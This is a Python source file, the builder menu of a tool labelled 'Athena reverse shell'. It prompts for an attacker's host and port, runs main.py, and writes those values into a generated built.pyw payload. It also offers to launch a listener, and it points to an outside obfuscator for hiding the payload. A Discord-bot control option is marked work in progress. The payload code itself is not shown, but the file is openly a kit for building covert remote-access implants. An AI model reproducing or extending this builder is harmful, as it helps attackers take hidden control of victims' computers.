from colorama import *
from pystyle import *
import time
import sys
import os

##Athena reverse shell made by misterzeee


intro = '''

 ▄▄▄     ▄▄▄█████▓ ██░ ██ ▓█████  ███▄    █  ▄▄▄      
▒████▄   ▓  ██▒ ▓▒▓██░ ██▒▓█   ▀  ██ ▀█   █ ▒████▄    
▒██  ▀█▄ ▒ ▓██░ ▒░▒██▀▀██░▒███   ▓██  ▀█ ██▒▒██  ▀█▄  
░██▄▄▄▄██░ ▓██▓ ░ ░▓█ ░██ ▒▓█  ▄ ▓██▒  ▐▌██▒░██▄▄▄▄██ 
 ▓█   ▓██▒ ▒██▒ ░ ░▓█▒░██▓░▒████▒▒█░ █  ▓██░ ▓█   ▓██▒          by misterzeee
 ▒▒   ▓▒█░ ▒ ░░    ▒ ░░▒░▒░░ ▒░ ░░ ▒░   ▒ ▒  ▒▒   ▓▒█░          built in python 3.11
  ▒   ▒▒ ░   ░     ▒ ░▒░ ░ ░ ░  ░░ ░░   ░ ▒░  ▒   ▒▒ ░
  ░   ▒    ░       ░  ░░ ░   ░      ░   ░ ░   ░   ▒   
      ░  ░         ░  ░  ░   ░  ░         ░       ░  ░

                    : Press Enter

'''

Anime.Fade(Center.Center(intro), Colors.black_to_green, Colorate.Vertical, interval=0.035, enter=True)

print(f'''{Fore.LIGHTGREEN_EX}

 ▄▄▄     ▄▄▄█████▓ ██░ ██ ▓█████  ███▄    █  ▄▄▄      
▒████▄   ▓  ██▒ ▓▒▓██░ ██▒▓█   ▀  ██ ▀█   █ ▒████▄    
▒██  ▀█▄ ▒ ▓██░ ▒░▒██▀▀██░▒███   ▓██  ▀█ ██▒▒██  ▀█▄  
░██▄▄▄▄██░ ▓██▓ ░ ░▓█ ░██ ▒▓█  ▄ ▓██▒  ▐▌██▒░██▄▄▄▄██ 
 ▓█   ▓██▒ ▒██▒ ░ ░▓█▒░██▓░▒████▒▒██░   ▓██░ ▓█   ▓██▒          by misterzeee
 ▒▒   ▓▒█░ ▒ ░░    ▒ ░░▒░▒░░ ▒░ ░░ ▒░   ▒ ▒  ▒▒   ▓▒█░          built in python 3.11
  ▒   ▒▒ ░   ░     ▒ ░▒░ ░ ░ ░  ░░ ░░   ░ ▒░  ▒   ▒▒ ░
  ░   ▒    ░       ░  ░░ ░   ░      ░   ░ ░   ░   ▒   
      ░  ░         ░  ░  ░   ░  ░         ░       ░  ░



''')

time.sleep(1)






def search_and_replace(file_path, search_word, replace_word):
   with open(file_path, 'r') as file:
      file_contents = file.read()

      updated_contents = file_contents.replace(search_word, replace_word)

   with open(file_path, 'w') as file:
      file.write(updated_contents)




##select

while True:
    Write.Print('\n[1] Build File', Colors.green_to_blue)
    Write.Print('\n[2] Listen', Colors.green_to_blue)
    Write.Print('\n[3] Obfuscate/compile', Colors.green_to_blue)
    Write.Print('\n[4] Exit', Colors.green_to_blue)
    Write.Print('\n:', Colors.green_to_blue)
    temp = input()

    if temp == '1':
        break
    if temp == '2':
        os.system('listener.py')
    if temp == '3':
        Write.Print('Use this tool: https://github.com/0sir1ss/Anubis', Colors.green_to_blue)
    if temp == '4':
        sys.exit(0)


Write.Print('\n[1] Host and Port', Colors.green_to_blue)
Write.Print('\n[2] Discord Bot', Colors.green_to_blue)
Write.Print('\n[3] Exit', Colors.green_to_blue)

Write.Print('\n:', Colors.green_to_blue)
temp = input('')


while True:

    if temp == '1':

        Write.Print('\nHost', Colors.green_to_blue)
        Write.Print(':', Colors.green_to_blue)
        SERVER_HOST = input('')
        Write.Print('\nPort', Colors.green_to_blue)
        Write.Print(':', Colors.green_to_blue)
        SERVER_PORT = input('')

        os.system('main.py')

        time.sleep(1)

        file_path = 'built.pyw'
        search_word = '%host%'
        replace_word = SERVER_HOST
        search_and_replace(file_path, search_word, replace_word)

        file_path = 'built.pyw'
        search_word = '%port%'
        replace_word = SERVER_PORT
        search_and_replace(file_path, search_word, replace_word)

        break

    if temp == '2':
        Write.Print('WIP follow this project to see when it is available...', Colors.green_to_blue)
        time.sleep(2)
        break

    if temp == '3':
        sys.exit(0)
